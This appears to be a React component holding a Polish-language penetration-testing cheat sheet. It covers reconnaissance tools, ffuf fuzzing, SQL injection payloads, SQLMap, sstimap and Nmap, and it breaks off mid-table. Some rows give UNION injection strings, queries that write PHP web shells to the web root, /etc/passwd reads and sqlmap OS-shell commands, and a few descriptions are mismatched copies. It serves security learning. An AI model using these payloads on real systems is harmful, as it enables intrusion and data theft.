import './commends.scss';
import { Link } from 'react-router-dom';
import sstimap_functions from '../../assets/sstimap_functions.png';
import ExampleFrame from '../exampleFrame/ExampleFrame';

const Commends = () => {

    return(
        <section className='commends'>
            
            <details id='curl'>
                <summary>cURL</summary>
                <table>
                    <thead>
                        <tr>
                            <th>Komenda</th>
                            <th>Przykład</th>
                            <th>Opis</th>
                        </tr>
                    </thead>
                    <tbody>
                    <tr>
                        <td>curl -O (nazwa strony HTTP)</td>
                        <td>curl -O inlanefreight.com/index.html</td>
                        <td>Pobieranie pliku</td>
                    </tr>
                    <tr>
                        <td>curl -s (nazwa strony HTTP)</td>
                        <td>curl -s inlanefreight.com/index.html</td>
                        <td>Wyciszenie zbędnych danych</td>
                    </tr>
                    <tr>
                        <td>curl -k (nazwa strony HTTPS://)</td>
                        <td>curl -k https://inlanefreight.com/index.html</td>
                        <td>Pomijanie certyfikatu SSL</td>
                    </tr>
                    <tr>
                        <td>curl -v (nazwa strony HTTP://)</td>
                        <td>curl -v inlanefreight.com</td>
                        <td>Pełen request oraz response</td>
                    </tr>
                    <tr>
                        <td>curl -vvv (nazwa strony HTTP://)</td>
                        <td>curl -vvv inlanefreight.com</td>
                        <td>Szczegółowy request oraz response</td>
                    </tr>
                    <tr>
                        <td>curl -u (nazwa strony HTTP://)</td>
                        <td>curl -u http://inlanefreight.com</td>
                        <td>Podstawowe poświadczenia autoryzacji HTTP</td>
                    </tr>
                    <tr>
                        <td>curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' (nazwa strony HTTP://)</td>
                        <td>curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://inlanefreight.com</td>
                        <td>Set request header, można wielokrotnie użyć by ustawić wiele nagłówków</td>
                    </tr>
                    <tr>
                        <td>curl -X POST -d 'username=admin&password=admin' (nazwa strony HTTP://)</td>
                        <td>curl -X POST -d 'username=admin&password=admin' http://inlanefreight.com</td>
                        <td>Wyślij żądanie POST z danymi</td>
                    </tr>
                    <tr>
                        <td>curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' (nazwa strony HTTP://)</td>
                        <td>curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://inlanefreight.com</td>
                        <td>Ustaw żądanie plików cookie</td>
                    </tr>
                    <tr>
                        <td>curl -X POST -d {"{"}"search":"london"{"}"} -H 'Content-Type: application/json' (nazwa strony HTTP://)</td>
                        <td>curl -X POST -d {"{"}"search":"london"{"}"} -H 'Content-Type: application/json' http://inlanefreight.com</td>
                        <td>Ustaw żądanie plików cookie</td>
                    </tr>
                    </tbody>
                </table>
            </details>

            <details>
                <summary>WHATWEB</summary>
                 <h4 className='important'>whatweb https://tesla.com</h4>
            </details>
            <details>
                <summary>NIKTO</summary>
                 <h4 className='important'>nikto -h http://tesla.com</h4>
            </details>

            <details>
                <summary>WHOIS</summary>
                <ul>
                    <li>
                        <span className='important'>Nazwa domeny (Domain Name)</span>: Nazwa domeny (np. example.com)</li>
                    <li>
                        <span className='important'>Zarejstrowana (Registrar)</span>: Firma, w której zarejestrowana została domena (np. GoDaddy, Namecheap)</li>
                    <li>
                        <span className='important'>Kontakt z rejestrującym (Registrant Contact)</span>: Osoba lub organizacja, która zarejestrowała domenę.</li>
                    <li>
                        <span className='important'>Kontakt administracyjny (Administrative Contact)</span>: Osoba odpowiedzialna za zarządzanie domeną (The person responsible for managing the domain)</li>
                    <li>
                        <span className='important'>Kontakt techniczny (Technical Contact)</span>: Osoba zajmująca się sprawami technicznymi związanymi z domeną.</li>
                    <li>
                        <span className='important'>Daty utworzenia i wygaśnięcia (Creation and Expiration Dates)</span>: Kiedy domena została zarejestrowana i kiedy wygaśnie.</li>
                    <li>
                    <span className='important'>Nazwa serwera (Name Servers)</span>: Serwery tłumaczące nazwę domeny na adres IP.</li>
                </ul>
                 <h4 className='important'>whois inlanefreight.com</h4>
            </details>

            <details id="dig">
                <summary>dig (Domain Information Groper)</summary>
                <p>Polecenie dig (Domain Information Groper) to wszechstronne i potężne narzędzie do wysyłania zapytań do serwerów DNS i pobierania różnych typów rekordów DNS. Jego elastyczność oraz szczegółowe i konfigurowalne wydruki sprawiają, że jest to doskonały wybór.</p>
                <table class="table table-striped text-left">
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        <th>Opis</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                        <td>dig domain.com</td>
                        <td>Wykonuje domyślne wyszukiwanie rekordów A dla domeny.</td>
                        </tr>
                        <tr>
                        <td>dig domain.com A</td>
                        <td>Pobiera adres IPv4 (rekord A) powiązany z domeną.</td>
                        </tr>
                        <tr>
                        <td>dig domain.com AAAA</td>
                        <td>Pobiera adres IPv6 (rekord AAAA) powiązany z domeną.</td>
                        </tr>
                        <tr>
                        <td>dig domain.com MX</td>
                        <td>Znajduje serwery pocztowe (rekordy MX) odpowiedzialne za domenę.</td>
                        </tr>
                        <tr>
                        <td>dig domain.com NS</td>
                        <td>Identyfikuje autorytatywne serwery nazw dla domeny.</td>
                        </tr>
                        <tr>
                        <td>dig domain.com TXT</td>
                        <td>Pobiera wszystkie rekordy TXT powiązane z domeną.</td>
                        </tr>
                        <tr>
                        <td>dig domain.com CNAME</td>
                        <td>Pobiera rekord nazwy kanonicznej (CNAME) dla domeny.</td>
                        </tr>
                        <tr>
                        <td>dig domain.com SOA</td>
                        <td>Pobiera rekord początku uprawnień (SOA) dla domeny.</td>
                        </tr>
                        <tr>
                        <td>dig @1.1.1.1 domain.com</td>
                        <td>Określa konkretny serwer nazw, do którego ma zostać wysłane zapytanie; w tym przypadku 1.1.1.1</td>
                        </tr>
                        <tr>
                        <td>dig +trace domain.com</td>
                        <td>Pokazuje pełną ścieżkę rozpoznawania DNS.</td>
                        </tr>
                        <tr>
                        <td>dig -x 192.168.1.1</td>
                        <td>Wykonuje wyszukiwanie wsteczne adresu IP 192.168.1.1 w celu znalezienia powiązanej nazwy hosta. Może być konieczne określenie serwera nazw.</td>
                        </tr>
                        <tr>
                        <td>dig +short domain.com</td>
                        <td>Podaje krótką i zwięzłą odpowiedź na zapytanie.</td>
                        </tr>
                        <tr>
                        <td>dig +noall +answer domain.com</td>
                        <td>Wyświetla tylko sekcję odpowiedzi wyniku zapytania.</td>
                        </tr>
                        <tr>
                        <td>dig domain.com ANY</td>
                        <td>Pobiera wszystkie dostępne rekordy DNS dla domeny (Uwaga: wiele serwerów DNS ignoruje ANY zapytania, aby zmniejszyć obciążenie i zapobiec nadużyciom, zgodnie z RFC 8482).</td>
                        </tr>
                        <tr>
                        <td>dig axfr @nsztm1.digi.ninja(DNS server) zonetransfer.me</td>
                        <td>To polecenie instruuje dig, aby zażądał pełnego transferu strefy (axfr) z serwera DNS odpowiedzialnego zazonetransfer.me. Jeśli serwer jest źle skonfigurowany i pozwala na transfer, otrzymasz pełną listę rekordów DNS dla domeny, łącznie ze wszystkimi subdomenami.</td>
                        </tr>
                    </tbody>
                </table>
                <div className='waring'>
                    <p>Uwaga: niektóre serwery mogą wykrywać i blokować nadmierną liczbę zapytań DNS. Zachowaj ostrożność i przestrzegaj limitów stawek. Zawsze uzyskaj pozwolenie przed wykonaniem obszernego rozpoznania DNS celu.</p>
                </div>

            </details>

            <details>
                <summary>dnsenum</summary>
                <p>Kompleksowe narzędzie do wyliczania DNS, które obsługuje ataki słownikowe i brute-force w celu wykrycia subdomen.</p>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                        <td>dnsenum --enum (nazwa strony) -f (lista słów (word list)) -r</td>
                        </tr>
                        <tr>
                        <td>dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r</td>
                        </tr>
                        <tr>
                        <td>dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb</td>
                        </tr>
                    </tbody>
                </table>
            </details>

            <details>
                <summary>dirbuster</summary>
                <p>Kompleksowe narzędzie do wyliczania plików na stronie.</p>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        <th>Opis</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                        <td>dirbuster&</td>
                        <td>włączenie narzędzia (okienkowe)</td>
                        </tr>
                    </tbody>
                </table>
            </details>
            
            <details>
                <summary>feroxbuster</summary>
                <p>Wielozadaniowe narzędzie często używane do brutalnego wymuszania katalogów/plików, ale także skuteczne do wykrywania hostów wirtualnych.</p>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                        <td>feroxbuster -u (http://target_IP_address) -w (wordlist_file)</td>
                        </tr>
                    </tbody>
                </table>

                <div className='waring'>
                    <p>W nowszych wersjach Gobustera flaga --append-domain jest wymagana w celu dołączenia domeny bazowej do każdego słowa na liście słów podczas wykrywania hosta wirtualnego. Ta flaga zapewnia, że ​​Gobuster poprawnie konstruuje pełne wirtualne nazwy hostów, co jest niezbędne do dokładnego wyliczenia potencjalnych subdomen. W starszych wersjach Gobuster ta funkcjonalność była obsługiwana inaczej i flaga --append-domain nie była konieczna. Użytkownicy starszych wersji mogą uznać tę flagę za niedostępną lub potrzebną, ponieważ narzędzie domyślnie dołączało domenę bazową lub wykorzystywało inny mechanizm generowania hosta wirtualnego.</p>
                </div>
            </details>

            <details>
                <summary>gobuster</summary>
                <p>Wielozadaniowe narzędzie często używane do brutalnego wymuszania katalogów/plików, ale także skuteczne do wykrywania hostów wirtualnych.</p>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                        <td>gobuster vhost -u (http://target_IP_address) -w (wordlist_file) --append-domain</td>
                        </tr>
                        <tr>
                        <td>gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain</td>
                        </tr>
                    </tbody>
                </table>

                <div className='waring'>
                    <p>W nowszych wersjach Gobustera flaga --append-domain jest wymagana w celu dołączenia domeny bazowej do każdego słowa na liście słów podczas wykrywania hosta wirtualnego. Ta flaga zapewnia, że ​​Gobuster poprawnie konstruuje pełne wirtualne nazwy hostów, co jest niezbędne do dokładnego wyliczenia potencjalnych subdomen. W starszych wersjach Gobuster ta funkcjonalność była obsługiwana inaczej i flaga --append-domain nie była konieczna. Użytkownicy starszych wersji mogą uznać tę flagę za niedostępną lub potrzebną, ponieważ narzędzie domyślnie dołączało domenę bazową lub wykorzystywało inny mechanizm generowania hosta wirtualnego.</p>
                </div>
            </details>

            <details>
                <summary>FFUF - Fuzzing</summary>
                <p>Odkrywanie stron.</p>
                <table>
                    <thead>
                        <tr>
                        <th>Opis</th>
                        <th>Komenda</th>
                        </tr>
                    </thead>
                    <tbody className='reverse'>
                        <tr>
                            <td>Odkrywanie katalogów</td>
                            <td>ffuf -w directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ</td>
                        </tr>
                        <tr>
                            <td>Zapytania request (Pamiętać by w pliku była zmienna FUZZ!!)</td>
                            <td>ffuf -w directory-list-2.3-small.txt:FUZZ -request {'<Plik z requestem>'}</td>
                        </tr>
                        <tr>
                            <td>Zapytania request każdy z każdym w zależności od ilości zmiennych(Pamiętać by w pliku była zmienne np: FUZZ1 i FUZZ2 !!)</td>
                            <td>ffuf -w directory-list-2.3-small.txt:FUZZ1 -w directory-list-2.3-small.txt:FUZZ2 -request {'<Plik z requestem>'} -mode clusterbomb</td>
                        </tr>
                        <tr>
                            <td>Odkrywanie drzewa subkatalogów o głębokości 1</td>
                            <td>ffuf -w directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v</td>
                        </tr>
                        <tr>
                            <td>Odkrywanie subkatalogów</td>
                            <td>ffuf -w subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.SERVER_IP:PORT/</td>
                        </tr>
                        <tr>
                            <td>Odkrywanie subkatalogów Vhostów</td>
                            <td>ffuf -w subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'</td>
                        </tr>
                        <tr>
                            <td>Odkrywanie parametrów</td>
                            <td>ffuf -w burp-parameter-names.txt:FUZZ -u http://SERVER_IP:PORT/index.php?FUZZ=key</td>
                        </tr>
                        <tr>
                            <td>Odkrywanie parametrów POST</td>
                            <td>ffuf -w burp-parameter-names.txt:FUZZ -u http://SERVER_IP:PORT/index.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded'</td>
                        </tr>
                        <tr>
                            <td>Odkrywanie wartości POST</td>
                            <td>ffuf -w ids.txt:FUZZ -u http://SERVER_IP:PORT/index.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'</td>
                        </tr>
                        <tr>
                            <td>Odkrywanie rozszerzenia plików</td>
                            <td>ffuf -w web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ</td>
                        </tr>
                        <tr>
                            <td>Enumeracja portów SSRF</td>
                            <td>ffuf -w ./ports.txt -u http://SERVER_IP/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://SERVER_IP:FUZZ/&date=2024-01-01" -fr "Failed to connect to"</td>
                        </tr>
                        <tr>
                            <td>Enumeracja LFI Api</td>
                            <td>ffuf -w /SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt:FUZZ -u 'http://{`<TARGET IP>`}:3000/api/FUZZ'"</td>
                        </tr>
                        <tr>
                            <td>Enumeracja LFI Api</td>
                            <td>ffuf -w subdomains-top1million-5000.txt:FUZZ -u 'http://{`<TARGET IP>:<PORT>`} -H 'Host: {`<Virtual Host>`}/FUZZ'</td>
                        </tr>
                    </tbody>
                </table>
            </details>

            <details>
                <summary>MySQL</summary>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                        <td>mysql -u root -p</td>
                        </tr>
                        <tr>
                        <td>mysql -u root -p{'<password>'}</td>
                        </tr>
                        <tr>
                        <td>mysql -u root -h {'<host/ ip>'} -P {'<port>'} -p </td>
                        </tr>
                        <tr>
                        <td>SHOW DATABASES; </td>
                        </tr>
                        <tr>
                        <td>USE {'<nazwa bazy>'}; </td>
                        </tr>
                        <tr>
                        <td>SHOW  {'<nazwa tabeli>'}; </td>
                        </tr>
                        <tr>
                        <td>SELECT * FROM logins WHERE username LIKE 'zaczynające się od(..)%'; </td>
                        </tr>
                        <tr>
                        <td>SELECT * FROM logins WHERE username like '(ilość znaków)_ _ _'; </td>
                        </tr>
                        <tr>
                        <td>SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;</td>
                        </tr>
                        <tr>
                        <td>cn' UNION select 1, kolumna 1, kolumna 2, 4 from {'<nazwa bazy danych>'}.{'<nazwa tabeli>'}-- -</td>
                        </tr>
                        <tr>
                        <td>cn' union select "",'{'<'}?php system($_REQUEST[0]); ?{'>'}', "", "" into outfile '/var/www/html/shell.php'-- -</td>
                        </tr>
                        <tr>
                        <td>SELECT "{`<`}?php echo shell_exec($_GET['c']);?{`>`}" INTO OUTFILE '/var/www/html/webshell.php';</td>
                        </tr>
                    </tbody>
                </table>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        <th>Przykład</th>
                        <th>Opis</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                        <td>database()</td>
                        <td>cn' UNION select 1,database(),2,3-- -</td>
                        <td>Zwraca aktualną bazę danych</td>
                        </tr>
                        <tr>
                        <td>user()</td>
                        <td>cn' UNION select 1,user(),2,3-- -</td>
                        <td>Zwraca aktualnego użytkownika</td>
                        </tr>
                        <tr>
                        <td>INFORMATION_SCHEMA.TABLES</td>
                        <td>cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='{'<nazwa bazy danych>'}'-- -</td>
                        <td>Zwraca table w bazie danych</td>
                        </tr>
                        <tr>
                        <td>INFORMATION_SCHEMA.COLUMNS</td>
                        <td>cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='{'<nazwa tabeli>'}'-- -</td>
                        <td>Zwraca kolumny we wskazanej tabeli</td>
                        </tr>
                        <tr>
                        <td>mysql.user -{'>'} super_priv</td>
                        <td>cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user='{'<nazwa użytkownika>'}'-- -</td>
                        <td>Zwraca boolean czy użytkownik jest super użytkownikiem (Y/ N)</td>
                        </tr>
                        <tr>
                        <td>information_schema.user_privileges</td>
                        <td>cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee='{"<nazwa użytkownika> ('root'@'localhost')"}'-- -</td>
                        <td>Zwraca boolean czy użytkownik jest super użytkownikiem (Y/ N)</td>
                        </tr>
                        <tr>
                        <td>LOAD_FILE("{'<ścieżka do pliku>'}")</td>
                        <td>cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -</td>
                        <td>Zwraca zawartość pliku</td>
                        </tr>
                        <tr>
                        <td>information_schema.global_variables -{'>'}secure_file_priv</td>
                        <td>cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -</td>
                        <td>Sprawdzamy możliwości zapisu plików</td>
                        </tr>
                        <tr>
                        <td>INTO OUTFILE</td>
                        <td>SELECT {'wartość do zapisania'} INTO OUTFILE '{'output gdzie to ma zostać zapisane'}';</td>
                        <td>Sprawdzamy zapisywanie w pliku</td>
                        </tr>
                    </tbody>
                </table>
            </details>

            <details>
                <summary>SQLMap</summary>
                <table>
                    <thead>
                        <tr>
                        <th><strong>Command</strong></th>
                        <th><strong>Description</strong></th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                        <td>sqlmap -u "http://www.example.com/vuln.php?id=1" --batch</td>
                        <td>Uruchom SQLMap bez pytania użytkownika o dane wejściowe</td>
                        </tr>
                        <tr>
                        <td>sqlmap 'http://www.example.com/' --data 'uid=1&name=test'</td>
                        <td>SQLMap z żądaniem POST</td>
                        </tr>
                        <tr>
                        <td>sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'</td>
                        <td>Żądanie POST określające punkt wtrysku gwiazdką</td>
                        </tr>
                        <tr>
                        <td>sqlmap -r req.txt</td>
                        <td>Przekazywanie pliku żądania HTTP do SQLMap</td>
                        </tr>
                        <tr>
                        <td>sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'</td>
                        <td>Określanie nagłówka pliku cookie</td>
                        </tr>
                        <tr>
                        <td>sqlmap -u www.target.com --data='id=1' --method PUT</td>
                        <td>Określanie żądania PUT</td>
                        </tr>
                        <tr>
                        <td>sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt</td>
                        <td>Przechowuj ruch w pliku wyjściowym</td>
                        </tr>
                        <tr>
                        <td>sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch</td>
                        <td>Określ poziom szczegółowości</td>
                        </tr>
                        <tr>
                        <td>sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"</td>
                        <td>Określanie prefix lub suffix</td>
                        </tr>
                        <tr>
                        <td>sqlmap -u www.example.com/?id=1 -v 3 --level=5</td>
                        <td>Określanie poziomu ryzyka</td>
                        </tr>
                        <tr>
                        <td>sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba</td>
                        <td>Podstawowe wyliczanie bazy danych</td>
                        </tr>
                        <tr>
                        <td>sqlmap -u "http://www.example.com/?id=1" --tables -D testdb</td>
                        <td>Wyliczenie tabel</td>
                        </tr>
                        <tr>
                        <td>sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname</td>
                        <td>Wyliczenie tabeli/wiersza</td>
                        </tr>
                        <tr>
                        <td>sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"</td>
                        <td>Wyliczenie warunkowe</td>
                        </tr>
                        <tr>
                        <td>sqlmap -u "http://www.example.com/?id=1" --schema</td>
                        <td>Wyliczenie schema </td>
                        </tr>
                        <tr>
                        <td>sqlmap -u "http://www.example.com/?id=1" --search -T user</td>
                        <td>Wyszukiwanie danych</td>
                        </tr>
                        <tr>
                        <td>sqlmap -u "http://www.example.com/?id=1" --passwords --batch</td>
                        <td>Wyliczanie i łamanie haseł</td>
                        </tr>
                        <tr>
                        <td>sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"</td>
                        <td>Obejście tokenu anty-CSRF</td>
                        </tr>
                        <tr>
                        <td>sqlmap --list-tampers</td>
                        <td>Lista wszystkich skryptów sabotażu</td>
                        </tr>
                        <tr>
                        <td>sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba</td>
                        <td>Sprawdź uprawnienia DBA</td>
                        </tr>
                        <tr>
                        <td>sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"</td>
                        <td>Czytanie pliku lokalnego</td>
                        </tr>
                        <tr>
                        <td>sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"</td>
                        <td>Zapisywanie pliku</td>
                        </tr>
                        <tr>
                        <td>sqlmap -u "http://www.example.com/?id=1" --os-shell</td>
                        <td>Tworzenie powłoki systemu operacyjnego</td>
                        </tr>
                    </tbody>
                </table>
            </details>

            <details>
                <summary>sstimap</summary>
                <table>
                    <thead>
                        <tr>
                        <th><strong>Komenda</strong></th>
                        <th><strong>Opis</strong></th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                        <td>python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'</td>
                        <td>Pobiera zdalny plik na naszą lokalną maszynę</td>
                        </tr>
                        <tr>
                        <td>python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id</td>
                        <td>Wykonywanie polecenie systemowe</td>
                        </tr>
                        <tr>
                        <td>sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'</td>
                        <td>Interaktywna powłoka</td>
                        </tr>
                    </tbody>
                </table>
                <ExampleFrame screen={sstimap_functions} />
            </details>

            <details>
                <summary>Nmap</summary>
                <table>
                    <thead>
                        <tr>
                            <th><strong>Nmap Opcja</strong></th>
                            <th><strong>Opis</strong></th>
                            <th><strong>Przykład</strong></th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>-iL</code></td>
                            <td>Wyłącza Ip z pliku</td>
                            <td>nmap -sn -oA tnet -iL hosts.lst</td>
                        </tr>
                        <tr>
                            <td><code>-sn</code></td>
                            <td>Wyłącza skanowanie portów</td>
                            <td>nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5</td>
                        </tr>
                        <tr>
                            <td><code>-Pn</code></td>
                            <td>Wyłącza żądania echa ICMP</td>
                            <td>nmap 10.129.2.28 -p 139 --packet-trace -n --disable-arp-ping -Pn</td>
                        </tr>
                        <tr>
                            <td><code>-n</code></td>
                            <td>Wyłącza rozpoznawanie DNS</td>
                            <td>nmap 10.129.2.28 -p 139 --packet-trace -n --disable-arp-ping -Pn</td>
                        </tr>
                        <tr>
                            <td><code>-PE</code></td>
                            <td>Wykonuje skanowanie ping przy użyciu żądań echa ICMP względem celu.</td>
                            <td>nmap 10.129.2.18 -sn -oA host -PE --packet-trace</td>
                        </tr>
                        <tr>
                            <td><code>--packet-trace</code></td>
                            <td>Pokazuje wszystkie wysłane i odebrane pakiety.</td>
                            <td>nmap 10.129.2.18 -sn -oA host -PE --packet-trace</td>
                        </tr>
                        <tr>
                            <td><code>--reason</code></td>
                            <td>Wyświetla przyczynę określonego wyniku.</td>
                            <td>nmap 10.129.2.18 -sn -oA host -PE --reason</td>
                        </tr>
                        <tr>
                            <td><code>--disable-arp-ping</code></td>
                            <td>Wyłącza żądania ping ARP.</td>
                            <td>nmap 10.129.2.18 -sn -oA host -PE --packet-trace --disable-arp-ping </td>
                        </tr>
                        <tr>
                            <td><code>--top-ports=&lt;num&gt;</code></td>
                            <td>Skanuje określone główne porty, które zostały zdefiniowane jako najczęściej.</td>
                            <td>nmap 10.129.2.28 --top-ports=10</td>
                        </tr>
                        <tr>
                            <td><code>-p-</code></td>
                            <td>Skanuje wszystkie porty.</td>
                            <td>nmap 10.129.2.28 -p- -oA target</td>
                        </tr>
                        <tr>
                            <td><code>-p22-110</code></td>
                            <td>Skanuje wszystkie porty między 22 a 110.</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td><code>-p22,25</code></td>
                            <td>Skanuje tylko wyznaczone porty 22 i 25.</td>
                            <td>nmap 10.129.2.28 -p22,25 --packet-trace -Pn -n --disable-arp-ping</td>
                        </tr>
                        <tr>
                            <td><code>-F</code></td>
                            <td>Skanije najczęstszych 100 portów.</td>
                            <td>nmap 10.129.2.0/24 -F</td>
                        </tr>
                        <tr>
                            <td><code>-sS</code></td>
                            <td>Wykonuje skanowanie SYN protokołu TCP.</td>
                            <td>nmap 10.129.2.28 -p 21,22,25 -sS -Pn -n --disable-arp-ping --packet-trace</td>
                        </tr>
                        <tr>
                            <td><code>-sA</code></td>
                            <td>Wykonuje skanowanie ACK protokołu TCP.</td>
                            <td>nmap 10.129.2.28 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace</td>
                        </tr>
                        <tr>
                            <td><code>-sU</code></td>
                            <td>Wykonuje skanowanie UDP.</td>
                            <td>nmap 10.129.2.28 -F -sU</td>
                        </tr>
                        <tr>
                            <td><code>-sV</code></td>
                            <td>Skanuje wykryte usługi w poszukiwaniu ich wersji.</td>
                            <td>nmap 10.129.2.28 -Pn -n --disable-arp-ping --packet-trace -p 445 --reason -sV</td>
                        </tr>
                        <tr>
                            <td><code>-sC</code></td>
                            <td>Wykonaj skanowanie skryptów ze skryptami sklasyfikowanymi jako „domyślne”</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td><code>--script &lt;script&gt;</code></td>
                            <td>Wykonuje skanowanie skryptów przy użyciu określonych skryptów.</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td><code>--script banner,smtp-commands</code></td>
                            <td>Używa określonych skryptów NSE.</td>
                            <td>nmap 10.129.2.28 -p 25 --script banner,smtp-commands</td>
                        </tr>
                        <tr>
                            <td><code>--script vuln</code></td>
                            <td>Używa wszystkich powiązanych skryptów z określonej kategorii.</td>
                            <td>nmap 10.129.2.28 -p 80 -sV --script vuln </td>
                        </tr>
                        <tr>
                            <td><code>-O</code></td>
                            <td>Wykonuje skanowanie w celu wykrycia systemu operacyjnego w celu określenia systemu operacyjnego docelowego</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td><code>-A</code></td>
                            <td>Wykonuje wykrywanie systemu operacyjnego, wykrywanie usług i skanowanie trastraute.</td>
                            <td>nmap 10.129.2.28 -p 80 -A</td>
                        </tr>
                        <tr>
                            <td><code>-D RND:5</code></td>
                            <td>Ustawia liczbę losowych wabików, które zostaną użyte do przeskanowania celu.</td>
                            <td>nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5</td>
                        </tr>
                        <tr>
                            <td><code>-e</code></td>
                            <td>Określa interfejs sieciowy używany do skanowania.</td>
                            <td>nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0</td>
                        </tr>
                        <tr>
                            <td><code>-S 10.10.10.200</code></td>
                            <td>Określa źródłowy adres IP dla skanowania.</td>
                            <td>nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0</td>
                        </tr>
                        <tr>
                            <td><code>-g</code></td>
                            <td>Określa port źródłowy skanowania.</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td><code>--dns-server &lt;ns&gt;</code></td>
                            <td>Rozpoznawanie DNS jest wykonywane przy użyciu określonego serwera nazw.</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td><code>--max-retries &lt;num&gt;</code></td>
                            <td>Ustawia liczbę ponownych prób skanowania określonych portów.</td>
                            <td></td>
                        </tr>
                        <tr>
                            <td><code>--stats-every=5s</code></td>
                            <td>Wyświetla status skanowania co 5 sekund.</td>
                            <td>nmap 10.129.2.28 -p- -sV --stats-every=5s</td>
                        </tr>
                        <tr>
                            <td><code>-v/-vv</code></td>
                            <td>Wyświetla szczegółowe dane wyjściowe podczas skanowania.</td>
                            <td>nmap 10.129.2.28 -p- -sV -v </td>
                        </tr>
                        <tr>
                            <td><code>--initial-rtt-timeout 50ms</code></td>
                            <td>Ustawia określoną wartość czasu jako początkowy limit czasu RTT.</td>
                            <td>nmap 10.129.2.0/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100ms</td>
                        </tr>
                        <tr>
                            <td><code>--max-rtt-timeout 100ms</code></td>
                            <td>Ustawia określoną wartość czasu jako maksymalny limit czasu RTT.</td>
                            <td>nmap 10.129.2.0/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100ms</td>
                        </tr>
                        <tr>
                            <td><code>--min-rate 300</code></td>
                            <td>Ustawia liczbę pakietów, które zostaną wysłane jednocześnie.</td>
                            <td>nmap 10.129.2.0/24 -F -oN tnet.minrate300 --min-rate 300</td>
                        </tr>
                        <tr>
                            <td><code>-T &lt;0-5&gt;</code></td>
                            <td>Określa konkretny szablon chronometrażu/ Szybkość skanowania (Im szybsze tym łatwiej zostać złapanym).</td>
